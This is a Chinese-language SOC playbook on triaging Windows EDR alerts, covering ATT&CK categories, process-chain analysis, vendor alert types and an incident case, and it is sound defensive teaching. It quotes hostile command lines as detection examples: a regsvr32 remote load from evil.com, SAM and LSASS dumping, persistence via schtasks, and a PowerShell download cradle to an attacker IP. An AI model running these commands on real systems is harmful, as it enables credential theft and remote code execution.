# Windows EDR 告警分析实战手册

---

## 📋 目录

1. [EDR 告警类型全景](#一告警类型)
2. [进程链分析方法论](#二进程链分析)
3. [CrowdStrike 告警实战](#三crowdstrike)
4. [Microsoft Defender 告警实战](#四defender)
5. [SentinelOne 告警实战](#五sentinelone)
6. [完整案例：告警深度分析](#六完整案例)

---

## 一、告警类型

### 1.1 按 ATT&CK 分类

```
Execution (执行):
  ✦ PowerShell EncodedCommand → 攻击者用 -enc 执行混淆代码
  ✦ WMI 创建进程 → wmic process call create
  ✦ MSHTA 执行 → mshta.exe 下载执行脚本
  ✦ Regsvr32 远程加载 → regsvr32 /s /n /u /i:http://evil.com scrobj.dll

Persistence (持久化):
  ✦ 计划任务创建 → 攻击者创建隐藏计划任务
  ✦ 注册表 Run 键新建 → 开机自启动
  ✦ WMI 事件订阅 → __EventFilter + CommandLineEventConsumer
  ✦ 服务创建 → sc create 后门服务

Credential Access (凭据窃取):
  ✦ LSASS 内存访问 → 非系统进程(如powershell)访问 lsass.exe
  ✦ SAM 注册表导出 → reg save HKLM\SAM
  ✦ NTDS.dit 访问 → 攻击者尝试 dump 域凭据库
  ✦ Kerberos 票据导出 → klist export / Mimikatz

Discovery (侦察):
  ✦ 大量 net user / net group → 枚举域用户
  ✦ Nmap/AdFind/BloodHound → 网络扫描工具
  ✦ whoami / systeminfo 批量执行

Lateral Movement (横向):
  ✦ PsExec Remote → 新创建的随机名服务(PSEXESVC-xxxx)
  ✦ WMI Remote → 远程主机上的 wmiprvse.exe
  ✦ WinRM Remote → 5985/5986 端口 + wsmprovhost.exe

C2/Exfiltration:
  ✦ 非标准端口 HTTPS → 443以外端口的TLS连接
  ✦ DNS 长域名 → 疑似 DNS 隧道
  ✦ 规则心跳 → 每60/120秒规律的出站连接
```

### 1.2 告警优先级

```
需要立即响应 (P1 — 15分钟内):
  ✦ 确认的恶意进程执行(PowerShell -enc / Mimikatz)
  ✦ LSASS 被非系统进程访问
  ✦ PsExec 远程执行
  ✦ DCSync 检测
  ✦ 勒索软件特征(大量文件在短时间内被修改)

需要快速响应 (P2 — 1小时内):
  ✦ 可疑进程链(Word→PowerShell、Java→cmd)
  ✦ 新服务/计划任务创建
  ✦ 异常登录(新IP/异常时间)
  ✦ 非工作时间的管理操作

可延后 (P3 — 4小时内):
  ✦ 端口扫描
  ✦ 失败登录(少量)
  ✦ 信息收集命令(whoami等单独执行)
```

---

## 二、进程链分析

### 2.1 核心方法论

```
进程链 = 从启动进程到当前进程的父子关系树

正常链 vs 恶意链:

正常:  services.exe → svchost.exe (系统服务)
正常:  explorer.exe → chrome.exe (用户操作)
可疑:  winword.exe → cmd.exe → powershell.exe (宏下载执行)
恶意:  java.exe → cmd.exe /c whoami (WebShell执行命令)
恶意:  wmiprvse.exe → powershell -enc SQBFAFgA... (WMI横向+编码执行)
```

### 2.2 经典攻击链识别

```
攻击链1: 钓鱼文档 → 宏执行
  WINWORD.EXE → cmd.exe → powershell.exe -enc <B64>
  EXCEL.EXE → wscript.exe → wmic process call create
  → 特征: Office 进程启动了命令行/脚本进程

攻击链2: WebShell → 命令执行
  w3wp.exe → cmd.exe /c whoami
  java/tomcat → /bin/bash -c '...'
  → 特征: Web服务进程启动了命令行

攻击链3: 凭据窃取
  taskmgr.exe → procdump.exe -ma lsass.exe
  任意.exe → OpenProcess(PROCESS_VM_READ, lsass.exe)
  → 特征: 非系统进程访问 LSASS

攻击链4: 横向移动
  远程主机: services.exe → PSEXESVC-XXXX.exe
  或: svchost.exe → wsmprovhost.exe (WinRM)
  → 特征: 远程触发的进程创建

攻击链5: 持久化
  cmd.exe → schtasks /create /tn "Update" /tr "evil.exe"
  powershell → New-Service -Name "SysHelp" -BinaryPathName "evil.dll"
  → 特征: 创建计划任务/服务
```

### 2.3 实战分析流程

```
步骤1: 查看告警时间 + 主机
  → 什么时候发生的？哪个主机？

步骤2: 查看进程树
  → 父进程 → 子进程 → 命令行参数
  → 是否是正常父子关系？

步骤3: 查看网络连接
  → 进程连接了哪些IP？哪些端口？
  → 是否是正常业务连接？

步骤4: 查看文件操作
  → 进程创建/修改了哪些文件？
  → 是否有在 Temp/用户目录 创建 exe/dll？

步骤5: 关联分析
  → 同一父进程在其他主机也执行了吗？
  → 同一IP连接了其他主机吗？
  → 同一用户在其他主机登录了吗？

步骤6: 判定
  → 真阳性 → 立即响应
  → 误报 → 标记 + 优化规则
  → 不确定 → 创建 Case 给 Tier2 深入分析
```

---

## 三、CrowdStrike

### 3.1 常见告警解读

```
告警类型: SuspiciousProcess
  检测: ParentImage=WINWORD.EXE → Image=powershell.exe
  含义: Word 启动了 PowerShell — 通常 = 宏下载执行
  判定: 真阳性 → 立即隔离主机

告警类型: CredentialDumping
  检测: Image=notepad.exe → OpenProcess(LSASS, PROCESS_VM_READ)
  含义: 可疑进程读取 LSASS 内存 — 凭据窃取
  判定: 真阳性 → 立即响应

告警类型: NetworkConnect
  检测: Image=svchost.exe → RemoteIP=45.xxx.xxx.xxx:443
  含义: 出站连接到已知恶意IP
  判定: 情报查验 → VT/AbuseIPDB

告警类型: SuspiciousDnsQuery
  检测: DomainName=abcdefghijklmnopqrstuvwxyz.com
  含义: 高熵值域名 — 可能是 DGA
  判定: 计算熵值 → >4.0 → 高可疑
```

### 3.2 CrowdStrike 查询

```bash
# Falcon 实时响应 (Real Time Response)
# 查询进程列表
ps

# 查询网络连接
netstat

# 查询事件日志
event_search * EventType=SuspiciousProcess

# 获取文件
get C:\Windows\Temp\suspicious.exe /tmp/sample.exe

# 隔离主机
contain host
```

---

## 四、Defender

### 4.1 常见告警

```
告警: "PowerShell downloading executable"
  DeviceEvents | where ActionType == "PowerShellCommand"
  → 查看: AdditionalFields 中的 Command

告警: "Suspicious process created by Office"
  DeviceProcessEvents | where InitiatingProcessFileName has_any ("WINWORD.EXE","EXCEL.EXE")
  | where FileName has_any ("powershell.exe","cmd.exe","wscript.exe")
  → 查看父子进程关系

告警: "Possible DCSync attack"
  IdentityLogonEvents | where Application == "Active Directory"
  | where ActionType == "Directory Service Access"
  → 非DC机器触发 = DCSync

告警: "Suspicious LDAP query"
  → ATA/MDI 检测: BloodHound/SharpHound 执行
```

---

## 五、SentinelOne

```
告警: Behavioral.Threat — "PowerShell Empire"
  检测: PowerShell + encrypted C2 traffic
  响应: 自动隔离(如果开启了 Active Response)

告警: Behavioral.Threat — "Mimikatz"
  检测: 读取 LSASS + sekurlsa 模块
  响应: 立即响应 + 凭据重置

告警: Infostealer — "Lazagne"
  检测: 已知凭据窃取工具的特征
  响应: 隔离 + 凭据重置
```

---

## 六、完整案例

```
案例: EDR 告警 → 发现 APT 入侵

Day 1 07:30 — 告警触发
  CrowdStrike: ParentImage=WINWORD.EXE → cmd.exe → powershell.exe -enc SQBFAFgA...
  主机: DESKTOP-SALES-01, 用户: zhangsan
  时间: 昨夜 23:45
  → 判定: 真阳性(宏文档下载执行), 但用户已下班 → 可能未察觉

Day 1 07:35 — 立即响应
  ✓ 网络隔离 DESKTOP-SALES-01
  ✓ 提取 PowerShell 编码内容: IEX(New-Object Net.WebClient).DownloadString('http://45.x.x.x/a')
  → 下载了 C2 Agent!

Day 1 07:45 — 关联分析
  ✓ 查询: 45.x.x.x 还连接了哪些主机?
  → DESKTOP-SALES-01, DESKTOP-ACCT-05, DESKTOP-ACCT-08 (3台!)
  ✓ 查询: zhangsan 在哪些主机有登录?
  → 除了 SALES-01, 还在 ACCT-05 有会话

Day 1 08:00 — 扩大响应
  ✓ 隔离 ACCT-05, ACCT-08
  ✓ 收集3台主机的日志 → SIEM 分析

Day 1 08:30 — 攻击链还原
  ① 钓鱼邮件(伪装客户询价) → zhangsan 打开附件
  ② 宏执行 → 下载 C2 Agent (PowerShell Empire)
  ③ C2通信 → 45.x.x.x:443 (每60秒心跳)
  ④ 横向移动 → WinRM → ACCT-05 (zhangsan 有本地管理员)
  ⑤ 凭据窃取 → Mimikatz → 获取本地管理员 Hash
  ⑥ 继续横向 → ACCT-08

Day 1 09:00 — 遏制
  ✓ 重置 zhangsan 密码
  ✓ 封禁 45.x.x.x IP(防火墙)
  ✓ 全网搜索 Empire 特征
  ✓ 全员通知钓鱼邮件警报

结论:
  EDR 告警 → 15分钟内定位 → 1小时内遏制 → 防止了可能的勒索/数据泄露
  如果没有EDR → 可能数天甚至数周后才被发现
```

---

## ✅ 告警分析清单

- [ ] 确认告警时间 + 主机 + 用户
- [ ] 分析进程树(父子关系)
- [ ] 查看命令行参数
- [ ] 查看网络连接(源/目标IP,端口)
- [ ] 判定真阳性/误报
- [ ] 真阳性 → 确认严重度 → Tier升级
- [ ] 关联分析(是否横向/多主机)
- [ ] 执行响应(隔离/遏制/清除)
